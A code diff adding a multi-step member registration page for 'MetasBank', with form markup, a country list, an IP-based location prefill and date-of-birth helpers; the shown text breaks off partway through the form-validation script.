@@ -1,0 +1,607 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>MetasBank — Register</title>
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <script src="supabase-config.js"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: { orange: { 50: '#fff3ed', 100: '#ffded3', 200: '#ffbca6', 300: '#ff8f6e', 400: '#ff6b42', 500: '#ff5c35', 600: '#e84a24', 700: '#c53b1b', 800: '#9e321a', 900: '#7f2c19' } },
+        }
+      }
+    }
+  </script>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=EB+Garamond:wght@400;500;600;700;800&display=swap");
+    *, *::before, *::after { box-sizing: border-box; }
+    * { font-family: "Inter", sans-serif; }
+    h1 { font-family: "EB Garamond", serif; text-transform: uppercase; font-weight: 800; letter-spacing: 0.02em; }
+    :root { --bg: #13151d; --bg-card: #1a1d28; --text: #e2e4e9; --text-muted: #6b7185; --text-secondary: #a8acba; --border: rgba(255,255,255,0.06); --input-bg: #0e1018; --shadow: rgba(255,92,53,0.2); --card-shadow: none; --header-h: 36px; }
+    .light-mode { --bg: #eef0f4; --bg-card: #ffffff; --text: #1e2229; --text-muted: #7a8191; --text-secondary: #4f5665; --border: rgba(0,0,0,0.06); --input-bg: #f0f1f4; --shadow: rgba(255,92,53,0.15); --card-shadow: 0 1px 3px rgba(0,0,0,0.04), 0 1px 2px rgba(0,0,0,0.03); }
+    html { height: 100%; width: 100%; overflow-x: hidden; }
+    body { width: 100%; max-width: 100%; height: 100%; background: var(--bg); transition: background 0.4s; -webkit-text-size-adjust: 100%; -moz-text-size-adjust: 100%; text-size-adjust: 100%; touch-action: manipulation; overflow-x: hidden; }
+    .card { background: var(--bg-card); border: 1px solid var(--border); box-shadow: var(--card-shadow); }
+    .gradient-orange { background: linear-gradient(135deg, #ff5c35, #ff8f6e); }
+    button:active { transform: scale(0.96); }
+    select { cursor: pointer; }
+    select option { background: var(--bg-card); color: var(--text); }
+    .step-dot { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; transition: all 0.3s; }
+    .step-dot.active { background: linear-gradient(135deg, #ff5c35, #ff8f6e); color: #fff; }
+    .step-dot.done { background: #10b981; color: #fff; }
+    .step-dot.pending { background: var(--input-bg); color: var(--text-muted); border: 1px solid var(--border); }
+    .step-line { flex: 1; height: 2px; transition: all 0.3s; }
+    .step-line.active { background: #ff5c35; }
+    .step-line.pending { background: var(--border); }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner { width: 40px; height: 40px; border: 3px solid var(--border); border-top-color: #ff5c35; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
+    input, select, textarea { font-size: 16px; touch-action: manipulation; }
+    .fixed-header { position: fixed; top: 0; left: 0; right: 0; z-index: 100; }
+    .main-content { padding-top: var(--header-h); flex: 1; display: flex; flex-direction: column; }
+    .footer-area { margin-top: auto; }
+  </style>
+  <style>html.js-loading *{transition:none!important}</style>
+  <script>
+    document.documentElement.classList.add('js-loading');
+    const _h = new Date().getHours(); if (_h >= 6 && _h < 18) document.documentElement.classList.add('light-mode');
+    document.addEventListener('DOMContentLoaded', function(){ requestAnimationFrame(function(){ document.documentElement.classList.remove('js-loading') }) });
+  </script>
+</head>
+<body class="flex flex-col" style="color: var(--text); min-height: 100vh; min-height: 100dvh;">
+
+  <!-- Fixed header -->
+  <header class="fixed-header flex items-center justify-between px-4 lg:px-6 py-2 text-[10px]" style="background: var(--bg-card); border-bottom: 1px solid var(--border);">
+    <div class="flex items-center gap-3 flex-wrap">
+      <span style="color: var(--text-muted);">Member Registration</span>
+      <span class="w-px h-3" style="background: var(--border);"></span>
+      <span style="color: var(--text-muted);">Session: <span class="text-[#10b981] font-medium">Encrypted</span></span>
+    </div>
+    <div class="shrink-0" style="color: var(--text-muted);">Secure registration portal</div>
+  </header>
+
+  <!-- Main content -->
+  <div class="main-content">
+    <div class="flex-1 flex items-center justify-center px-4 py-6">
+      <div class="w-full max-w-sm">
+
+        <!-- Step Progress -->
+        <div id="stepProgress" class="flex items-center gap-2 mb-6">
+          <div class="step-dot active" id="s1d">1</div>
+          <div class="step-line pending" id="s1l"></div>
+          <div class="step-dot pending" id="s2d">2</div>
+          <div class="step-line pending" id="s2l"></div>
+          <div class="step-dot pending" id="s3d">3</div>
+        </div>
+
+      <!-- Step 1 -->
+      <div id="step1" class="card rounded-xl p-6">
+        <h2 class="text-sm font-bold mb-1" style="color: var(--text);">Personal Information</h2>
+        <p class="text-[11px] mb-5" style="color: var(--text-muted);">Step 1 of 3</p>
+        <div class="space-y-4">
+          <div>
+            <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Full Name <span style="color:#ff5c35;">*</span></label>
+            <input id="rName" type="text" placeholder="Your full name" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+          </div>
+          <div>
+            <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Date of Birth <span style="color:#ff5c35;">*</span></label>
+            <div class="grid grid-cols-3 gap-2">
+              <select id="rDobMonth" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+                <option value="">Month</option>
+                <option value="01">Jan</option><option value="02">Feb</option><option value="03">Mar</option>
+                <option value="04">Apr</option><option value="05">May</option><option value="06">Jun</option>
+                <option value="07">Jul</option><option value="08">Aug</option><option value="09">Sep</option>
+                <option value="10">Oct</option><option value="11">Nov</option><option value="12">Dec</option>
+              </select>
+              <select id="rDobDay" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+                <option value="">Day</option>
+<option value="01">1</option><option value="02">2</option><option value="03">3</option><option value="04">4</option><option value="05">5</option><option value="06">6</option><option value="07">7</option><option value="08">8</option><option value="09">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option>
+              </select>
+              <select id="rDobYear" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+                <option value="">Year</option>
+<option value="2026">2026</option><option value="2025">2025</option><option value="2024">2024</option><option value="2023">2023</option><option value="2022">2022</option><option value="2021">2021</option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option><option value="1904">1904</option><option value="1903">1903</option><option value="1902">1902</option><option value="1901">1901</option><option value="1900">1900</option>
+              </select>
+            </div>
+          </div>
+          <div>
+            <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Phone Number <span style="color:#ff5c35;">*</span></label>
+            <div class="flex gap-2">
+              <select id="rPhoneCode" class="w-[100px] shrink-0 rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+                <option value="+1">+1</option>
+                <option value="+44">+44</option><option value="+61">+61</option>
+                <option value="+49">+49</option><option value="+33">+33</option><option value="+39">+39</option>
+                <option value="+34">+34</option><option value="+31">+31</option><option value="+46">+46</option>
+                <option value="+47">+47</option><option value="+45">+45</option><option value="+358">+358</option>
+                <option value="+41">+41</option><option value="+43">+43</option><option value="+32">+32</option>
+                <option value="+353">+353</option><option value="+351">+351</option><option value="+30">+30</option>
+                <option value="+48">+48</option><option value="+420">+420</option><option value="+36">+36</option>
+                <option value="+40">+40</option><option value="+7">+7</option><option value="+81">+81</option>
+                <option value="+86">+86</option><option value="+91">+91</option><option value="+55">+55</option>
+                <option value="+52">+52</option><option value="+82">+82</option><option value="+65">+65</option>
+                <option value="+60">+60</option><option value="+63">+63</option><option value="+62">+62</option>
+                <option value="+66">+66</option><option value="+84">+84</option><option value="+27">+27</option>
+                <option value="+234">+234</option><option value="+20">+20</option><option value="+972">+972</option>
+                <option value="+971">+971</option><option value="+966">+966</option><option value="+90">+90</option>
+                <option value="+54">+54</option><option value="+56">+56</option><option value="+57">+57</option>
+                <option value="+92">+92</option><option value="+880">+880</option><option value="+98">+98</option>
+              </select>
+              <input id="rPhone" type="tel" placeholder="Your phone number" class="flex-1 rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+            </div>
+          </div>
+          <div>
+            <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Email Address <span style="color:#ff5c35;">*</span></label>
+            <input id="rEmail" type="email" placeholder="your@email.com" class="w-full rounded-lg px-4 py-3 text-[13px] font-mono focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+          </div>
+        </div>
+        <button id="step1NextBtn" class="w-full mt-6 py-3 rounded-lg gradient-orange text-white text-[13px] font-bold hover:opacity-90 transition-all" style="box-shadow: 0 4px 15px var(--shadow);">Next →</button>
+        <div id="step1Error" class="hidden mt-3 rounded-lg px-4 py-2.5 text-[12px] font-medium" style="background: rgba(255,71,87,0.1); color: #ff4757; border: 1px solid rgba(255,71,87,0.15);"></div>
+      </div>
+      <!-- Step 2: Address -->
+      <div id="step2" class="card rounded-xl p-6 hidden">
+        <h2 class="text-sm font-bold mb-1" style="color: var(--text);">Address</h2>
+        <p class="text-[11px] mb-5" style="color: var(--text-muted);">Step 2 of 3 — Where do you live?</p>
+        <div class="space-y-4">
+          <div>
+            <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Street Address <span style="color:#ff5c35;">*</span></label>
+            <input id="rStreet" type="text" placeholder="Street address, building, apartment" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+          </div>
+          <div class="grid grid-cols-2 gap-3">
+            <div>
+              <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">City <span style="color:#ff5c35;">*</span></label>
+              <input id="rCity" type="text" placeholder="Your city" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+            </div>
+            <div>
+              <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">State / Province <span style="color:#ff5c35;">*</span></label>
+              <input id="rState" type="text" placeholder="State / Region" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+            </div>
+          </div>
+          <div class="grid grid-cols-2 gap-3">
+            <div>
+              <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">ZIP / Postal Code <span style="color:#ff5c35;">*</span></label>
+              <input id="rZip" type="text" placeholder="Postal code" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+            </div>
+            <div>
+              <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Country <span style="color:#ff5c35;">*</span></label>
+              <select id="rCountry" class="w-full rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              </select>
+            </div>
+          </div>
+        </div>
+        <div class="flex gap-3 mt-6">
+          <button id="step2BackBtn" class="flex-1 py-3 rounded-lg text-[13px] font-semibold transition-all" style="background: var(--hover); color: var(--text-secondary); border: 1px solid var(--border);">← Back</button>
+          <button id="step2NextBtn" class="flex-1 py-3 rounded-lg gradient-orange text-white text-[13px] font-bold hover:opacity-90 transition-all" style="box-shadow: 0 4px 15px var(--shadow);">Next →</button>
+        </div>
+        <div id="step2Error" class="hidden mt-3 rounded-lg px-4 py-2.5 text-[12px] font-medium" style="background: rgba(255,71,87,0.1); color: #ff4757; border: 1px solid rgba(255,71,87,0.15);"></div>
+      </div>
+      <!-- Step 3: Review -->
+      <div id="step3" class="card rounded-xl p-6 hidden">
+        <h2 class="text-sm font-bold mb-1" style="color: var(--text);">Review & Submit</h2>
+        <p class="text-[11px] mb-5" style="color: var(--text-muted);">Step 3 of 3 — Confirm your details</p>
+        <div class="rounded-xl overflow-hidden mb-3" style="border: 1px solid var(--border);">
+          <div class="px-4 py-2.5 text-[10px] font-semibold uppercase tracking-wider" style="background: rgba(255,92,53,0.08); color: #ff5c35; border-bottom: 1px solid var(--border);">Personal Information</div>
+          <div class="p-4 space-y-3">
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">Name</span><span id="rvName" class="text-[12px] font-semibold text-right" style="color: var(--text);"></span></div>
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">Date of Birth</span><span id="rvDob" class="text-[12px] font-semibold text-right" style="color: var(--text);"></span></div>
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">Phone</span><span id="rvPhone" class="text-[12px] font-semibold text-right" style="color: var(--text);"></span></div>
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">Email</span><span id="rvEmail" class="text-[12px] font-semibold text-right font-mono" style="color: var(--text);"></span></div>
+          </div>
+        </div>
+        <div class="rounded-xl overflow-hidden" style="border: 1px solid var(--border);">
+          <div class="px-4 py-2.5 text-[10px] font-semibold uppercase tracking-wider" style="background: rgba(16,185,129,0.08); color: #10b981; border-bottom: 1px solid var(--border);">Address</div>
+          <div class="p-4 space-y-3">
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">Street</span><span id="rvAddress" class="text-[12px] font-semibold text-right" style="color: var(--text);"></span></div>
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">City</span><span id="rvCity" class="text-[12px] font-semibold text-right" style="color: var(--text);"></span></div>
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">State / Region</span><span id="rvState" class="text-[12px] font-semibold text-right" style="color: var(--text);"></span></div>
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">Postal Code</span><span id="rvZip" class="text-[12px] font-semibold text-right" style="color: var(--text);"></span></div>
+            <div class="flex items-center justify-between"><span class="text-[10px] font-medium uppercase tracking-wide" style="color: var(--text-muted);">Country</span><span id="rvCountry" class="text-[12px] font-semibold text-right" style="color: var(--text);"></span></div>
+          </div>
+        </div>
+        <div class="flex gap-3 mt-6">
+          <button id="step3BackBtn" class="flex-1 py-3 rounded-lg text-[13px] font-semibold transition-all" style="background: var(--hover); color: var(--text-secondary); border: 1px solid var(--border);">← Edit</button>
+          <button id="submitBtn" class="flex-1 py-3 rounded-lg gradient-orange text-white text-[13px] font-bold hover:opacity-90 transition-all" style="box-shadow: 0 4px 15px var(--shadow);">Register</button>
+        </div>
+        <div id="step3Error" class="hidden mt-3 rounded-lg px-4 py-2.5 text-[12px] font-medium" style="background: rgba(255,71,87,0.1); color: #ff4757; border: 1px solid rgba(255,71,87,0.15);"></div>
+      </div>
+
+      <!-- Processing -->
+      <div id="processingView" class="card rounded-xl p-8 hidden">
+        <div class="text-center">
+          <div class="spinner"></div>
+          <p class="text-sm font-bold mt-5" style="color: var(--text);">Creating your account</p>
+          <p class="text-[11px] mt-2" style="color: var(--text-muted);">Please wait while we set everything up</p>
+          <div class="mt-4 space-y-1 text-[10px]" style="color: var(--text-muted);">
+            <p id="procStep1">&#10003; Collecting your information</p>
+            <p id="procStep2" class="opacity-30">Generating secure credentials</p>
+            <p id="procStep3" class="opacity-30">Finalizing your account</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Success -->
+      <div id="signupSuccess" class="hidden">
+        <div class="text-center mb-8">
+          <div class="w-14 h-14 rounded-2xl gradient-orange flex items-center justify-center text-white font-black text-base mx-auto" style="box-shadow: 0 0 25px var(--shadow);">MB</div>
+          <h1 class="text-xl font-bold mt-4" style="color: var(--text);">Registration Complete</h1>
+          <p class="text-[12px]" style="color: var(--text-muted);">Your account has been created</p>
+        </div>
+        <div class="rounded-xl p-6 card space-y-4">
+          <div class="rounded-lg p-4 text-center" style="background: rgba(16,185,129,0.06); border: 1px solid rgba(16,185,129,0.15);">
+            <svg class="w-10 h-10 mx-auto text-[#10b981]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+            <p class="text-sm font-bold mt-2" style="color: var(--text);">Account Created Successfully</p>
+            <p class="text-[10px] mt-1" style="color: var(--text-muted);">Save your credentials below</p>
+          </div>
+          <div class="text-[11px] space-y-3">
+            <div class="flex items-center justify-between rounded-lg p-3" style="background: var(--input-bg); border: 1px solid var(--border);">
+              <div><span class="font-semibold text-[10px] uppercase tracking-wide" style="color: var(--text-muted);">Username</span><div id="newUsername" class="font-mono text-sm font-bold mt-0.5" style="color: var(--text);"></div></div>
+              <button id="copyUsernameBtn" class="px-3 py-1.5 rounded-lg text-[10px] font-semibold transition-all shrink-0" style="background: var(--hover); color: var(--text-secondary); border: 1px solid var(--border);">Copy</button>
+            </div>
+            <div class="flex items-center justify-between rounded-lg p-3" style="background: var(--input-bg); border: 1px solid var(--border);">
+              <div><span class="font-semibold text-[10px] uppercase tracking-wide" style="color: var(--text-muted);">Password</span><div id="accessKeyDisplay" class="font-mono text-sm font-bold mt-0.5 tracking-wider" style="color: #ff5c35;"></div></div>
+              <button id="copyKeyBtn" class="px-3 py-1.5 rounded-lg text-[10px] font-semibold transition-all shrink-0" style="background: var(--hover); color: var(--text-secondary); border: 1px solid var(--border);">Copy</button>
+            </div>
+          </div>
+          <p class="text-[10px] text-center" style="color: var(--text-muted);">Credentials have been sent to your email.</p>
+          <a href="/login/" class="block w-full py-3 rounded-lg gradient-orange text-white text-[13px] font-bold hover:opacity-90 transition-all text-center" style="box-shadow: 0 4px 15px var(--shadow);">Proceed to Sign In</a>
+        </div>
+      </div>
+
+      <!-- Already Used -->
+      <div id="alreadyUsed" class="hidden">
+        <div class="text-center mb-8">
+          <div class="w-14 h-14 rounded-2xl flex items-center justify-center text-white font-black text-base mx-auto" style="background: rgba(255,71,87,0.1); color: #ff4757;">
+            <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m0 0v2m0-2h2m-2 0H10m9.364-7.364A9 9 0 1112 3a9 9 0 017.364 4.636z"/></svg>
+          </div>
+          <h1 class="text-xl font-bold mt-4" style="color: var(--text);">Already Used</h1>
+          <p class="text-[12px]" style="color: var(--text-muted);">This registration link has already been used in this browser.</p>
+        </div>
+      </div>
+
+      </div>
+    </div>
+
+    <!-- Footer (outside flex-1 centering so it sticks to bottom) -->
+    <footer class="footer-area px-4 py-4 text-center">
+      <p class="text-[10px]" style="color: var(--text-muted);">&copy; 2026 MetasBank. All rights reserved.</p>
+    </footer>
+
+  </div>
+  <script>
+    let lastGeneratedKey = "";
+
+    // ===== COUNTRY DATA (196 countries) =====
+    const COUNTRIES = [
+["Afghanistan","AF"],["Albania","AL"],["Algeria","DZ"],["Andorra","AD"],["Angola","AO"],
+["Antigua and Barbuda","AG"],["Argentina","AR"],["Armenia","AM"],["Australia","AU"],["Austria","AT"],
+["Azerbaijan","AZ"],["Bahamas","BS"],["Bahrain","BH"],["Bangladesh","BD"],["Barbados","BB"],
+["Belarus","BY"],["Belgium","BE"],["Belize","BZ"],["Benin","BJ"],["Bhutan","BT"],
+["Bolivia","BO"],["Bosnia and Herzegovina","BA"],["Botswana","BW"],["Brazil","BR"],["Brunei","BN"],
+["Bulgaria","BG"],["Burkina Faso","BF"],["Burundi","BI"],["Cambodia","KH"],["Cameroon","CM"],
+["Canada","CA"],["Cape Verde","CV"],["Central African Republic","CF"],["Chad","TD"],["Chile","CL"],
+["China","CN"],["Colombia","CO"],["Comoros","KM"],["Congo","CG"],["Congo (DRC)","CD"],
+["Costa Rica","CR"],["Cote d'Ivoire","CI"],["Croatia","HR"],["Cuba","CU"],["Cyprus","CY"],
+["Czech Republic","CZ"],["Denmark","DK"],["Djibouti","DJ"],["Dominica","DM"],["Dominican Republic","DO"],
+["Ecuador","EC"],["Egypt","EG"],["El Salvador","SV"],["Equatorial Guinea","GQ"],["Eritrea","ER"],
+["Estonia","EE"],["Eswatini","SZ"],["Ethiopia","ET"],["Fiji","FJ"],["Finland","FI"],
+["France","FR"],["Gabon","GA"],["Gambia","GM"],["Georgia","GE"],["Germany","DE"],
+["Ghana","GH"],["Greece","GR"],["Grenada","GD"],["Guatemala","GT"],["Guinea","GN"],
+["Guinea-Bissau","GW"],["Guyana","GY"],["Haiti","HT"],["Honduras","HN"],["Hungary","HU"],
+["Iceland","IS"],["India","IN"],["Indonesia","ID"],["Iran","IR"],["Iraq","IQ"],
+["Ireland","IE"],["Israel","IL"],["Italy","IT"],["Jamaica","JM"],["Japan","JP"],
+["Jordan","JO"],["Kazakhstan","KZ"],["Kenya","KE"],["Kiribati","KI"],["Kuwait","KW"],
+["Kyrgyzstan","KG"],["Laos","LA"],["Latvia","LV"],["Lebanon","LB"],["Lesotho","LS"],
+["Liberia","LR"],["Libya","LY"],["Liechtenstein","LI"],["Lithuania","LT"],["Luxembourg","LU"],
+["Madagascar","MG"],["Malawi","MW"],["Malaysia","MY"],["Maldives","MV"],["Mali","ML"],
+["Malta","MT"],["Marshall Islands","MH"],["Mauritania","MR"],["Mauritius","MU"],["Mexico","MX"],
+["Micronesia","FM"],["Moldova","MD"],["Monaco","MC"],["Mongolia","MN"],["Montenegro","ME"],
+["Morocco","MA"],["Mozambique","MZ"],["Myanmar","MM"],["Namibia","NA"],["Nauru","NR"],
+["Nepal","NP"],["Netherlands","NL"],["New Zealand","NZ"],["Nicaragua","NI"],["Niger","NE"],
+["Nigeria","NG"],["North Korea","KP"],["North Macedonia","MK"],["Norway","NO"],["Oman","OM"],
+["Pakistan","PK"],["Palau","PW"],["Palestine","PS"],["Panama","PA"],["Papua New Guinea","PG"],
+["Paraguay","PY"],["Peru","PE"],["Philippines","PH"],["Poland","PL"],["Portugal","PT"],
+["Qatar","QA"],["Romania","RO"],["Russia","RU"],["Rwanda","RW"],["Saint Kitts and Nevis","KN"],
+["Saint Lucia","LC"],["Saint Vincent and the Grenadines","VC"],["Samoa","WS"],["San Marino","SM"],
+["Sao Tome and Principe","ST"],["Saudi Arabia","SA"],["Senegal","SN"],["Serbia","RS"],
+["Seychelles","SC"],["Sierra Leone","SL"],["Singapore","SG"],["Slovakia","SK"],["Slovenia","SI"],
+["Solomon Islands","SB"],["Somalia","SO"],["South Africa","ZA"],["South Korea","KR"],
+["South Sudan","SS"],["Spain","ES"],["Sri Lanka","LK"],["Sudan","SD"],["Suriname","SR"],
+["Sweden","SE"],["Switzerland","CH"],["Syria","SY"],["Taiwan","TW"],["Tajikistan","TJ"],
+["Tanzania","TZ"],["Thailand","TH"],["Timor-Leste","TL"],["Togo","TG"],["Tonga","TO"],
+["Trinidad and Tobago","TT"],["Tunisia","TN"],["Turkey","TR"],["Turkmenistan","TM"],
+["Tuvalu","TV"],["Uganda","UG"],["Ukraine","UA"],["United Arab Emirates","AE"],
+["United Kingdom","GB"],["United States","US"],["Uruguay","UY"],["Uzbekistan","UZ"],
+["Vanuatu","VU"],["Vatican City","VA"],["Venezuela","VE"],["Vietnam","VN"],
+["Yemen","YE"],["Zambia","ZM"],["Zimbabwe","ZW"]
+    ];
+    // ===== COUNTRY DROPDOWN =====
+    (function() {
+      let sel = document.getElementById("rCountry");
+      if (!sel) return;
+      sel.innerHTML = '<option value="">Select country</option>';
+      for (let i = 0; i < COUNTRIES.length; i++) {
+        let opt = document.createElement("option");
+        opt.value = COUNTRIES[i][0];
+        opt.textContent = COUNTRIES[i][0];
+        sel.appendChild(opt);
+      }
+    })();
+
+    // ===== AUTO-LOCATION =====
+    (function() {
+      fetch("https://ipapi.co/json/").then(function(r) { return r.json() }).then(function(d) {
+        if (d.country_name) {
+          let sel = document.getElementById("rCountry");
+          for (let i = 0; i < sel.options.length; i++) {
+            if (sel.options[i].value === d.country_name) { sel.value = sel.options[i].value; break; }
+          }
+        }
+        if (d.city) document.getElementById("rCity").value = d.city || "";
+      }).catch(function() {});
+    })();
+    // ===== DOB DAYS =====
+    (function() {
+      let monthSel = document.getElementById("rDobMonth");
+      let daySel = document.getElementById("rDobDay");
+      let yearSel = document.getElementById("rDobYear");
+      if (!monthSel || !daySel) return;
+      function daysInMonth(m, y) { return y ? new Date(y, m, 0).getDate() : [0,31,28,31,30,31,30,31,31,30,31,30,31][m] || 31 }
+      function updateDays() {
+        let m = parseInt(monthSel.value, 10);
+        let y = parseInt(yearSel ? yearSel.value : 0, 10);
+        let max = m ? daysInMonth(m, y || 0) : 31;
+        let currentVal = daySel.value;
+        daySel.innerHTML = '<option value="">Day</option>';
+        for (let d = 1; d <= max; d++) {
+          let v = d < 10 ? '0' + d : '' + d;
+          let opt = document.createElement("option");
+          opt.value = v; opt.textContent = d;
+          if (v === currentVal) opt.selected = true;
+          daySel.appendChild(opt);
+        }
+      }
+      monthSel.addEventListener("change", updateDays);
+      if (yearSel) yearSel.addEventListener("change", updateDays);
+    })();
+    // ===== STEP FUNCTIONS =====
+    function getDob() {
+      let m = document.getElementById("rDobMonth").value;
+      let d = document.getElementById("rDobDay").value;
+      let y = document.getElementById("rDobYear").value;
+      if (!m || !d || !y) return "";
+      return y + "-" + m + "-" + d;
+    }
+
+    function formatDob() {
+      let m = document.getElementById("rDobMonth").value;
+      let d = document.getElementById("rDobDay").value;
+      let y = document.getElementById("rDobYear").value;
+      if (!m || !d || !y) return "\u2014";
+      const months = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
+      return months[parseInt(m)-1] + " " + parseInt(d) + ", " + y;
+    }
+
+    function goStep2() {
+      let name = document.getElementById("rName").value.trim();
+      let dob = getDob();
+      let phone = document.getElementById("rPhone").value.trim();
